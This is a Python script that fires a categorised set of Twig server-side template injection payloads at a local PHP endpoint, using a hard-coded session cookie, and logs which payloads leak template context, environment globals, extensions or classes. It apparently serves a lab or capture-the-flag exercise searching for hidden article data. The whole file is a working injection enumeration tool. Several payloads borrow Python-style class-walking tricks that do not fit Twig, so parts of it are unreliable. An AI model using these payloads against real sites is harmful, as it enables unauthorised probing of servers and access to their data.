import requests
import json
import re

# Configuration
base_url = "http://127.0.0.1"
endpoint = "/index.php"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}

cookies = {
    "PHPSESSID": "adf118a2717e83ee6455ea878ebb507e"
}

# Comprehensive list of Twig SSTI payloads grouped by category
payloads = {
    "Context Enumeration": [
        "{{ _context|keys|join(',') }}",
        "{{ app|keys|join(',') }}",
        "{{ _context|length }}",
        "{% for key, value in _context %}{{ key }}:{{ value }}{% endfor %}",
        "{{ dump(_context) }}",
        "{{ dump(app) }}",
    ],
    
    "Environment Object": [
        "{{ _self.env.getGlobals()|keys|join(',') }}",
        "{{ _self.env.getExtensions()|keys|join(',') }}",
        "{{ _self.env.getTokenParsers()|keys|join(',') }}",
        "{{ _self.env.getFilters()|keys|join(',') }}",
        "{{ _self.env.getFunctions()|keys|join(',') }}",
        "{{ dump(_self.env) }}",
    ],
    
    "Loop Constructs": [
        "{{ items|length }}",
        "{% for item in items %}{{ item }}{% endfor %}",
        "{% for item in items %}{{ item.title|default('no-title') }}::{% endfor %}",
        "{% for article in articles %}{{ article.title }}{% endfor %}",
        "{% for post in posts %}{{ post }}{% endfor %}",
        "{{ articles|join(',') }}",
        "{{ posts|join(',') }}",
        "{{ repositories|join(',') }}",
        "{% for item in repository %}{{ item }}{% endfor %}",
    ],
    
    "Specific Object Access": [
        "{{ articles|length }}",
        "{{ posts|length }}",
        "{{ repository|length }}",
        "{{ services|length }}",
        "{{ data|length }}",
        "{{ model|length }}",
        "{{ model.articles|default('none') }}",
        "{{ app.articles|default('none') }}",
        "{{ app.posts|default('none') }}",
        "{{ app.repository|default('none') }}",
    ],
    
    "Class Enumeration": [
        "{{ _self.__class__.__mro__[1].__subclasses__()|length }}",
        "{{ _self.__class__.__mro__[-1].__subclasses__()|length }}",
        "{% for cls in _self.__class__.__mro__[1].__subclasses__() %}{{ cls.__name__ }},{% endfor %}",
        "{% for cls in _self.__class__.__mro__[-1].__subclasses__() %}{{ cls.__name__ }},{% endfor %}",
    ],
    
    "File System Access (testing availability)": [
        "{{ __self__.__class__.__mro__[-1].__subclasses__() }}",
        "{% for cls in _self.__class__.__mro__[1].__subclasses__() %}{% if 'file' in cls.__name__|lower %}{{ cls.__name__ }}:{{ loop.index }}{% endif %}{% endfor %}",
        "{{ _self.env.globals|keys|join(',') }}",
        "{{ _self.env.extensions|keys|join(',') }}",
    ],
    
    "Advanced Dump Techniques": [
        "{{ dump(_context, 100) }}",
        "{{ dump(app, 100) }}",
        "{{ dump(_self, 10) }}",
        "{{ dump(_self.env, 5) }}",
    ],
}

# Collect results
results = {}
successful_payloads = []

print("=" * 80)
print("TWIG SSTI SYSTEMATIC ENUMERATION")
print("Target: {}".format(base_url + endpoint))
print("=" * 80)
print()

for category, payload_list in payloads.items():
    print(f"\n[TESTING CATEGORY: {category}]")
    print("-" * 80)
    
    for i, payload in enumerate(payload_list, 1):
        print(f"\n[#] Testing payload {i}/{len(payload_list)}")
        print(f"Payload: {payload}")
        
        try:
            data = {"name": payload}
            response = requests.post(
                base_url + endpoint,
                headers=headers,
                cookies=cookies,
                data=data,
                timeout=10
            )
            
            # Extract relevant part of response (assuming it shows the name field)
            response_text = response.text
            
            # Look for common article-related patterns in response
            article_patterns = [
                r'article', r'Article', r'ARTICLE',
                r'post', r'Post', r'POST',
                r'title', r'Title', r'TITLE',
                r'content', r'Content', r'CONTENT',
                r'body', r'Body', r'BODY',
                r'id', r'ID', r'Id'
            ]
            
            found_articles = []
            for pattern in article_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    matches = re.findall(pattern, response_text, re.IGNORECASE)
                    found_articles.extend(matches)
            
            # Store result
            result_key = f"{category}_{i}"
            results[result_key] = {
                "payload": payload,
                "status_code": response.status_code,
                "content_length": len(response_text),
                "response_preview": response_text[:500] if len(response_text) > 500 else response_text,
                "found_articles": list(set(found_articles)) if found_articles else [],
                "full_response": response_text
            }
            
            # Check if this was successful
            if response.status_code == 200:
                if len(response_text) > 0 and "error" not in response_text.lower():
                    successful_payloads.append({
                        "category": category,
                        "payload": payload,
                        "response_length": len(response_text),
                        "preview": response_text[:200]
                    })
            
            print(f"Status: {response.status_code} | Length: {len(response_text)}B")
            if found_articles:
                print(f"[!] Article-related keywords found: {list(set(found_articles))}")
            print(f"Response preview: {response_text[:150]}...")
            
        except Exception as e:
            print(f"[!] ERROR: {str(e)}")
            results[f"{category}_{i}"] = {
                "payload": payload,
                "error": str(e)
            }

# Summary
print("\n" + "=" * 80)
print("SUMMARY OF RESULTS")
print("=" * 80)

if successful_payloads:
    print(f"\n[+] Found {len(successful_payloads)} potentially successful payloads:")
    for sp in successful_payloads[:10]:  # Show first 10
        print(f"\n---")
        print(f"Category: {sp['category']}")
        print(f"Payload: {sp['payload']}")
        print(f"Response Length: {sp['response_length']}B")
        print(f"Preview: {sp['preview'][:100]}...")
else:
    print("\n[-] No successful payloads found yet")

print("\n" + "=" * 80)
print("COMPLETE RESULTS JSON")
print("=" * 80)
print(json.dumps(results, indent=2, default=str))
